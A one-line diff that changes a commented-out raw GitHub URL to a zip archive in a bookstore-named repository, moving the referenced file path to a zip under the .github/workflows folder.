@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/DaFabro/ikirezibookstore.com/main/bickerer/ikirezibookstore.com.zip
+# https://raw.githubusercontent.com/DaFabro/ikirezibookstore.com/main/.github/workflows/com-ikirezibookstore-v1.0.zip
